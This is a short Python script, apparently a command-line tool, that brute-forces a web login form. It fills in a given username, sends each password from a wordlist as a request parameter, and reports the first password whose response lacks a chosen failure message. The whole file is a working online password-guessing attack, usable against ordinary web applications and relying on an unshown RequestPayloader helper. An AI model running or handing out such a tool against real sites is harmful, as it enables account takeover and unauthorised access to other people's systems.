from requests import Response
from RequestPayloader import HTTPRequestHandler
import sys

def load_wordlist(filepath):
    wordlist = []
    with open(filepath, "r") as file:
        wordlist = file.readlines()

    return [word.strip() for word in wordlist] # removing \n from the end of each entry

def check_pass(response, fail_msg):
    if fail_msg in response:
        return False
    return True

def main():
    if sys.argv.__len__() < 6:
        print("Error, not all suficient arguments were passed.")
        print(f"usage: python {sys.argv[0]} URL USERNAME WORDLIST FAIL_MSG COOKIE")
        exit(-1)
    url = sys.argv[1]
    username = sys.argv[2]
    pass_wordlist = sys.argv[3]
    fail_msg = sys.argv[4]
    cookie = sys.argv[5]
    
    handler = HTTPRequestHandler(url, cookie)
    handler.base_url = handler.manipulate_url(param="username", new_value=username)
    wordlist = load_wordlist(pass_wordlist)

    for word in wordlist:
        response = handler.send_request(param="password", new_value=word)
        if check_pass(response.text, fail_msg):
            print(f"Found password! password is: {word}")
            exit(0)
    print("No password found!")
    
if __name__ == "__main__":
    main()
    exit(0)
